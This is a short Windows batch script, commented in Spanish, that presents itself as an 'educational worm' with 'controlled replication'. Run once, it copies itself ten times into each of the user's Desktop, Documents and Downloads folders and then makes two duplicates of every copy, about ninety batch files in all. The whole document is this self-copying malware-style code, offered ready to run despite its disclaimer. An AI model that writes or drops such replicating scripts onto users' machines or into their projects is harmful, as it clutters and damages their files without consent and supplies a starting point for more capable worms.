@echo off
:: Gusano educativo en batch con replicación automática controlada.
:: Creado para fines educativos - No usar de manera maliciosa.

:: Establecer el número de réplicas y la cantidad de duplicados por réplica
set /a num_replicas=10   :: Número de réplicas a crear
set /a num_duplicates=2  :: Número de duplicados por réplica

:: Nombre del archivo replicado
set "script_name=%~nx0"

:: Directorios donde replicar el gusano (Documentos, Escritorio, etc.)
set "paths=%USERPROFILE%\Desktop %USERPROFILE%\Documents %USERPROFILE%\Downloads"

:: Crear réplicas iniciales
for /L %%i in (1,1,%num_replicas%) do (
    for %%j in (%paths%) do (
        copy "%~f0" "%%~j\replica%%i.bat"
        echo Replica creada en "%%~j\replica%%i.bat"
    )
)

:: Crear duplicados para cada réplica
for /L %%i in (1,1,%num_replicas%) do (
    for /L %%k in (1,1,%num_duplicates%) do (
        for %%j in (%paths%) do (
            copy "%%~j\replica%%i.bat" "%%~j\replica%%i_dup%%k.bat"
            echo Duplicado creado en "%%~j\replica%%i_dup%%k.bat"
        )
    )
)

:end
echo "Proceso finalizado."
pause
exit